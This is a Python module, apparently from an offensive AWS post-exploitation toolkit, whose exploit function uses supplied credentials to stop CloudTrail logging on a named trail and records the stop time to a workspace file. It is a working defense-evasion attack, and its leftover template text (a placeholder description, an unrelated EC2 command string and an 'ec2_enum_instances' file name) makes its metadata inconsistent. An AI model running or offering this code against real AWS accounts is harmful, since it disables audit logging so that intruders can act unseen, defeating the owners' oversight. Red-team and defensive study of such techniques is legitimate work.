import boto3
from termcolor import colored
from datetime import datetime
import json
from pydoc import pipepager

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "cloudtrail",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"TRAIL-NAME": {
		"value": "",
		"required": "true",
        "description":"Specifies the name or the CloudTrail ARN of the trail for which CloudTrail will stop logging Amazon Web Services API calls."
	}
}
description = "Description of your Module"

aws_command = "aws ec2 describe-launch-templates --region {} --profile {}"

def exploit(profile, workspace):
	now = datetime.now()
	dt_string = now.strftime("%d_%m_%Y_%H_%M_%S")
	file = "{}_ec2_enum_instances".format(dt_string)
	filename = "./workspaces/{}/{}".format(workspace, file)

	name = variables["TRAIL-NAME"]['value']

	response = profile.stop_logging(
		Name=name
	)

	if len(response) == 0:
		json_data = {
			"TrailName": name,
			"StopTime": dt_string
		}
		with open(filename, 'w') as outfile:
			json.dump(json_data, outfile, indent=4, default=str)
			print(colored("[*] Content dumped on file '{}'.".format(filename), "green"))

		print("{}{}{}".format(
			colored("[*] Trail '","green"),
			colored(name,"blue"),
			colored("' was stopped.","green")
		))
	else:
		print(response)